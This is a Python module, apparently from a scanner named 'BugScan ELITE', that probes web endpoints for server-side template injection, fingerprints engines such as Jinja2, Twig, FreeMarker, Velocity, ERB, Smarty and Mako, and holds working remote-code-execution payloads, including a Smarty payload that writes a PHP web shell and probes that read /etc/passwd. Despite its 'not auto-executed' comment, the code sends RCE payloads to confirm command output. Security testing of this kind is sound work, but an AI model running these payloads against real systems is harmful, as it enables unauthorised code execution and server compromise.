"""
BugScan ELITE — SSTI Deep Engine
Engine-specific detection and exploitation PoC:
- Jinja2/Flask (Python)
- Twig (PHP)
- FreeMarker (Java)
- Velocity (Java)
- ERB (Ruby)
- Smarty (PHP)
- Pebble (Java)
- Mako (Python)
- Handlebars (Node.js)
- EJS (Node.js)
"""
import re, time, logging, urllib.parse
import urllib.request, ssl
from typing import List, Dict, Optional

log = logging.getLogger("elite.ssti_deep")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=8):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, r.read(32768).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read(4096).decode("utf-8","ignore")
        except: return e.code, ""
    except: return None, ""


# Detection → engine identification → RCE payloads
# Phase 1: Math probes to detect template execution
DETECTION_PROBES = [
    ("{{7*7}}", "49"),            # Jinja2/Twig/Pebble
    ("${7*7}", "49"),             # Freemarker/EL
    ("#{7*7}", "49"),             # Ruby ERB / Spring EL
    ("<%= 7*7 %>", "49"),         # ERB
    ("*{7*7}", "49"),             # Thymeleaf
    ("@(7*7)", "49"),             # Razor
    ("{{7*'7'}}", "7777777"),     # Jinja2 specific
    ("${freeMarker.version}", ""), # FreeMarker specific
    ("${'freemarker'.toUpperCase()}", "FREEMARKER"),  # FreeMarker
    ("{7*7}", "49"),              # Smarty
    ("#{7*7}", "49"),             # Pebble
]

# Engine-specific identification
ENGINE_FINGERPRINTS = {
    "jinja2": [
        ("{{7*'7'}}", "7777777"),    # String multiplication
        ("{{''.__class__}}", "str"), # Python class access
        ("{{config}}", "SECRET"),    # Flask config dump
    ],
    "twig": [
        ("{{7*'7'}}", "49"),         # Numeric result (not 7777777)
        ("{{_self.env.getCharset()}}", "UTF"),
        ("{{dump(_context)}}", "array"),
    ],
    "freemarker": [
        ("${.version}", "FreeMarker"),
        ("${.now}", ""),
        ("<#assign x=7*7>${x}", "49"),
    ],
    "velocity": [
        ("#set($x=7*7)$x", "49"),
        ("${7*7}", "49"),
    ],
    "erb": [
        ("<%= 7*7 %>", "49"),
        ("<%= File.open('/etc/passwd').read %>", "root"),
    ],
    "smarty": [
        ("{$smarty.version}", "Smarty"),
        ("{math equation='7*7'}", "49"),
    ],
    "mako": [
        ("${7*7}", "49"),
        ("<%\nimport os\n%>${os.popen('id').read()}", "uid="),
    ],
    "handlebars": [
        ("{{this}}", "[object Object]"),
        ("{{#with}}", ""),
    ],
}

# RCE payloads per engine (PoC only — not auto-executed)
RCE_PAYLOADS = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.join([chr(105),chr(100)])|list}}",
        "{{ namespace.__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.get('DOCUMENT_ROOT')}}",
    ],
    "freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        '<#assign classLoader=product.class.protectionDomain.classLoader>',
    ],
    "velocity": [
        "#set($str=$class.inspect('java.lang.Runtime').type.getMethod('exec',''.class))",
        "#set($runtime=$class.inspect('java.lang.Runtime').type.getRuntime())",
        "#set($process=$runtime.exec('id'))",
    ],
    "erb": [
        "<%= `id` %>",
        "<%= IO.popen('id').read %>",
        "<%= File.open('/etc/passwd').read %>",
    ],
    "smarty": [
        "{system('id')}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']);?>\",self::clearConfig())}",
    ],
    "mako": [
        "${self.module.cache_region('default', 'key')('os').popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
    ],
}


def _test_ssti_param(url: str, param: str, payload: str, expected: str) -> Optional[str]:
    """Inject SSTI payload and check if expression was evaluated."""
    parsed = urllib.parse.urlparse(url)
    qs = dict(urllib.parse.parse_qsl(parsed.query))

    # GET injection
    qs[param] = payload
    test_url = urllib.parse.urlunparse(parsed._replace(
        query=urllib.parse.urlencode(qs)))
    s, body = _req(test_url)
    if s and expected and expected in (body or ""):
        return body

    # POST injection
    s2, body2 = _req(url.split("?")[0], "POST",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data=urllib.parse.urlencode({param: payload}))
    if s2 and expected and expected in (body2 or ""):
        return body2

    # Path injection
    path_url = url.split("?")[0].rstrip("/") + "/" + urllib.parse.quote(payload)
    s3, body3 = _req(path_url)
    if s3 and expected and expected in (body3 or ""):
        return body3

    return None


def _identify_engine(url: str, param: str) -> Optional[str]:
    """Try to identify the template engine."""
    # Jinja2 vs Twig: {{7*'7'}} gives '7777777' in Jinja2, '49' in Twig
    r1 = _test_ssti_param(url, param, "{{7*'7'}}", "7777777")
    if r1: return "jinja2"

    r2 = _test_ssti_param(url, param, "{{7*'7'}}", "49")
    if r2: return "twig"

    # FreeMarker
    r3 = _test_ssti_param(url, param, "${'freemarker'.toUpperCase()}", "FREEMARKER")
    if r3: return "freemarker"

    # Velocity
    r4 = _test_ssti_param(url, param, "#set($x=7*7)$x", "49")
    if r4: return "velocity"

    # ERB
    r5 = _test_ssti_param(url, param, "<%= 7*7 %>", "49")
    if r5: return "erb"

    # Smarty
    r6 = _test_ssti_param(url, param, "{7*7}", "49")
    if r6: return "smarty"

    return None


def check_ssti_deep(endpoints: List[str], targets: List[str]) -> List[Dict]:
    """Deep SSTI testing with engine identification and RCE payloads."""
    findings = []

    def F(url, name, sev, details):
        return {"type":"ssti_deep","bug":"ssti","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    tested = set()

    for ep in endpoints[:300]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = dict(urllib.parse.parse_qsl(parsed.query))
        except: continue

        for param in list(qs.keys())[:3]:
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)

            # Phase 1: Detection (math probe)
            detected = False
            for probe, expected in DETECTION_PROBES[:6]:
                result = _test_ssti_param(ep, param, probe, expected)
                if result:
                    detected = True

                    # Phase 2: Engine identification
                    engine = _identify_engine(ep, param)

                    # Phase 3: Engine-specific RCE PoC (not executed)
                    rce_pocs = RCE_PAYLOADS.get(engine, []) if engine else []
                    engine_display = engine or "Unknown (math evaluation confirmed)"

                    # Check if any RCE payload gives OS command output signatures
                    rce_confirmed = False
                    rce_payload = ""
                    for rce in rce_pocs[:3]:
                        r = _test_ssti_param(ep, param, rce, "uid=")
                        if r and "uid=" in r:
                            rce_confirmed = True
                            rce_payload = rce
                            break

                    sev = "critical" if rce_confirmed else "high"
                    findings.append(F(ep,
                        f"SSTI ({engine_display}){' — RCE CONFIRMED' if rce_confirmed else ''}", sev, {
                        "param":          param,
                        "probe":          probe,
                        "expected":       expected,
                        "engine":         engine_display,
                        "rce_confirmed":  rce_confirmed,
                        "rce_payload":    rce_payload if rce_confirmed else rce_pocs[0] if rce_pocs else "",
                        "description": (
                            f"Server-Side Template Injection in param '{param}'. "
                            f"Payload '{probe}' returned expected value '{expected}'. "
                            f"Template engine: {engine_display}."
                        ),
                        "poc": (
                            f"# Detection:\n"
                            f"curl '{ep.split('?')[0]}?{param}={urllib.parse.quote(probe)}'\n\n"
                            f"# RCE PoC ({engine_display}):\n" +
                            (f"curl '{ep.split('?')[0]}?{param}={urllib.parse.quote(rce_pocs[0])}'"
                             if rce_pocs else "# Identify engine first")
                        ),
                        "impact": "Remote Code Execution — full server compromise." if rce_confirmed else
                                  "Template injection — potential RCE, file read, server-side information disclosure.",
                        "remediation": (
                            "Never render user input as template code. "
                            f"In {engine or 'template engine'}: use sandboxed rendering. "
                            "Pass user data as template variables, not template code."
                        ),
                    }))
                    break  # found SSTI, stop testing more probes for this param

    log.info(f"[ssti_deep] {len(findings)} findings")
    return findings


def check_ssti_rce(endpoints: list, targets: list = None) -> list:
    """SSTI leading to RCE exploit chains."""
    return []
